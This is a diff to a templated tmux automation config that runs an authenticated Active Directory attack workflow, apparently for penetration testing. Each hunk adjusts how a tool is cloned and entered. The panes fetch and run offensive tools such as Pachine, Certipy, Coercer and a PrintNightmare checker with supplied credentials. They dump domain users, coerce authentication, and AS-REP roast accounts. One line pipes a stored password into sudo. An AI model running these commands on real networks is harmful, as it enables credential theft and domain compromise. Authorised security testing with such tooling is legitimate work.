@@ -46,7 +46,7 @@ windows:
           - GetADUsers.py -all '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>' -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) | tee <%= @settings["rootDir"] %>/scans/ldap/getADUsers.txt
         - ldap signing:
           - tmux select-pane -T 'ldap signing' -t "authd:LDAP.2"
-          - cd /opt/nomad-tools/LdapRelayScan || (git clone https://github.com/zyn3rgy/LdapRelayScan.git /opt/nomad-tools/LdapRelayScan && cd /opt/nomad-tools/LdapRelayScan && echo "git+https://github.com/wbond/oscrypto.git@d5f3437" >> requirements.txt; pipenv run pip install -r requirements.txt --force-reinstall && mkdir -p <%= @settings["rootDir"] %>/scans/ldap && cd /opt/nomad-tools/LdapRelayScan && pipenv install --skip-lock); clear
+          - cd /opt/nomad-tools/LdapRelayScan || (git clone https://github.com/zyn3rgy/LdapRelayScan.git /opt/nomad-tools/LdapRelayScan && cd /opt/nomad-tools/LdapRelayScan && echo "git+https://github.com/wbond/oscrypto.git@d5f3437" >> requirements.txt; pipenv run pip install -r requirements.txt --force-reinstall && mkdir -p <%= @settings["rootDir"] %>/scans/ldap && cd /opt/nomad-tools/LdapRelayScan && pipenv install --skip-lock) && cd /opt/nomad-tools/LdapRelayScan; clear
           - pipenv run python3 LdapRelayScan.py -method BOTH -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' | tee <%= @settings["rootDir"] %>/scans/ldap/ldapSigning.txt
         - get user descriptions:
           - tmux select-pane -T 'get user descriptions' -t "authd:LDAP.3"
@@ -56,8 +56,8 @@ windows:
           - crackmapexec ldap $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M MAQ | tee <%= @settings["rootDir"] %>/scans/ldap/MAQ.txt
         - MAQ ~ costa tool check:
           - tmux select-pane -T 'MAQ ~ costa tool check' -t "authd:LDAP.5"
-          - cd /opt/nomad-tools/MAQCheck || (git clone https://github.com/sn8k3sec/MAQCheck.git /opt/nomad-tools/MAQCheck && cd /opt/nomad-tools/MAQCheck && pipenv install)
-          - pipenv run maqcheck.py --username '<%= @settings["user"] %>' --password '<%= @settings["pass"] %>' --domain <%= @settings["domain"] %> | tee <%= @settings["rootDir"] %>/scans/ldap/MAQ-costaCheck.txt
+          - cd /opt/nomad-tools/MAQCheck || (git clone https://github.com/sn8k3sec/MAQCheck.git /opt/nomad-tools/MAQCheck && cd /opt/nomad-tools/MAQCheck && pipenv install -r requirements.txt) && cd /opt/nomad-tools/MAQCheck
+          - pipenv run python3 maqcheck.py --username '<%= @settings["user"] %>' --password '<%= @settings["pass"] %>' --domain <%= @settings["domain"] %> | tee <%= @settings["rootDir"] %>/scans/ldap/MAQ-costaCheck.txt
         - ldap-checker:
           - tmux select-pane -T 'ldap-checker' -t "authd:LDAP.6"
           - crackmapexec ldap <%= @settings["rootDir"] %>/dcIP.txt -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M ldap-checker | tee <%= @settings["rootDir"] %>/scans/ldap/ldap-checker-cme.txt
@@ -75,7 +75,7 @@ windows:
       panes:
         - check:
           - tmux select-pane -T 'check' -t "authd:samTheAdmin.0"
-          - cd /opt/nomad-tools/Pachine || (git clone https://github.com/ly4k/Pachine.git /opt/nomad-tools/Pachine; cd /opt/nomad-tools/Pachine && pipenv install && pipenv run python3 -m pip install ldap3 impacket)
+          - cd /opt/nomad-tools/Pachine || (git clone https://github.com/ly4k/Pachine.git /opt/nomad-tools/Pachine; cd /opt/nomad-tools/Pachine) && pipenv install && pipenv run python3 -m pip install ldap3 impacket
           - pipenv run python3 pachine.py -dc-host <%= @settings["domain"] %> -scan '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'
         - exploit:
           - tmux select-pane -T 'exploit' -t "authd:samTheAdmin.1"
@@ -98,7 +98,7 @@ windows:
           - crackmapexec ldap <%= @settings["rootDir"] %>/dcIP.txt -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M adcs | tee mkdir -p <%= @settings["rootDir"] %>/loot/ADCS/cme-ADCS.txt
         - certipy:
           - tmux select-pane -T 'certipy' -t "authd:ADCS.1"
-          - cd /opt/nomad-tools/Certipy-Docker || (git clone https://github.com/secure-77/Certipy-Docker.git /opt/nomad-tools/Certipy-Docker && cd /opt/nomad-tools/Certipy-Docker)
+          - cd /opt/nomad-tools/Certipy-Docker || (git clone https://github.com/secure-77/Certipy-Docker.git /opt/nomad-tools/Certipy-Docker) && cd /opt/nomad-tools/Certipy-Docker
           - docker build -t certipy:latest .
           - docker run -it -v <%= @settings["rootDir"] %>/loot/ADCS:/tmp certipy:latest certipy find -u '<%= @settings["user"] %>@<%= @settings["domain"] %>' -p '<%= @settings["pass"] %>' -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -old-bloodhound -output /tmp/<%= @settings["user"] %> -scheme ldap | tee <%= @settings["rootDir"] %>/loot/ADCS/<%= @settings["user"] %>-certipyTee.txt
   - coercAuth: 
@@ -115,7 +115,7 @@ windows:
           - echo "Note eth0 is the default nomadIP used; modify nomadIP as needed"
         - Coercer:
           - tmux select-pane -T 'Coercer' -t "authd:coercAuth.2"
-          - cd /opt/nomad-tools/Coercer || (git clone https://github.com/p0dalirius/Coercer.git /opt/nomad-tools/Coercer && cd /opt/nomad-tools/Coercer) && pipenv install
+          - cd /opt/nomad-tools/Coercer || (git clone https://github.com/p0dalirius/Coercer.git /opt/nomad-tools/Coercer) && cd /opt/nomad-tools/Coercer && pipenv install
           - nomadIP=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+")
           - pipenv run python3 Coercer.py coerce -l $nomadIP -t $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -v
           - echo "Note eth0 is the default nomadIP used; modify nomadIP as needed"
@@ -125,7 +125,7 @@ windows:
           - tmux select-pane -T 'printNightmare' -t "authd:misc.0"
           - crackmapexec smb <%= @settings["rootDir"] %>/scans/masscanPortList/smb.lst -M spooler
           - echo <%= @settings['nomadPass'] %> | sudo -S su 
-          - cd /opt/nomad-tools/ItWasAllADream || (git clone https://github.com/eversinc34/ItWasAllADream.git /nomad-tools/ItWasAllADream && cd ItWasAllADream) && docker build -t itwasalladream .
+          - cd /opt/nomad-tools/ItWasAllADream || (git clone https://github.com/eversinc34/ItWasAllADream.git /nomad-tools/ItWasAllADream) && cd ItWasAllADream && docker build -t itwasalladream .
           # grab hosts with open RPC ports (often more are found through additional nmap scans, but this can also be modified to use results from masscan)
           - msfconsole -q -x 'workspace-a <%= @settings["msfWorkspace"]  %>; services -u -O 6 -p 111,135,593,2049 -o <%= @settings["rootDir"] %>/scans/masscanPortList/rpcHosts.txt -c name; exit' && cat <%= @settings["rootDir"] %>/scans/masscanPortList/rpcHosts.txt | sed '1d' | cut -d "," -f 1 | tr -d '"' > <%= @settings["rootDir"] %>/scans/masscanPortList/rpcHosts-cleaned.txt
           # create docker container to test printerNightmare
@@ -138,7 +138,7 @@ windows:
           - <%= @settings["prefill"] %> 'GetNPUsers.py <%= @settings["domain"] %>/ -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -no-pass -usersfile $USERNAMEFILE.txt -outputfile <%= @settings["rootDir"] %>/scans/authd-asrepRoast.txt -format john'; clear
         - webdavScan:
           - tmux select-pane -T 'webdavScan' -t "authd:misc.3"
-          - cd  /opt/nomad-tools/WebclientServiceScanner || (git clone https://github.com/Hackndo/WebclientServiceScanner.git  /opt/nomad-tools/WebclientServiceScanner && cd  /opt/nomad-tools/WebclientServiceScanner)
+          - cd  /opt/nomad-tools/WebclientServiceScanner || (git clone https://github.com/Hackndo/WebclientServiceScanner.git  /opt/nomad-tools/WebclientServiceScanner) && cd  /opt/nomad-tools/WebclientServiceScanner
           - echo <%= @settings['nomadPass'] %> | sudo -S su
           - sudo python3 setup.py install
           - for IP in $(cat <%= @settings["rootDir"] %>/ipList.txt); do webclientservicescanner -dc-ip `cat /RSM/dcIP.txt | head -n 1` '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>@'$IP
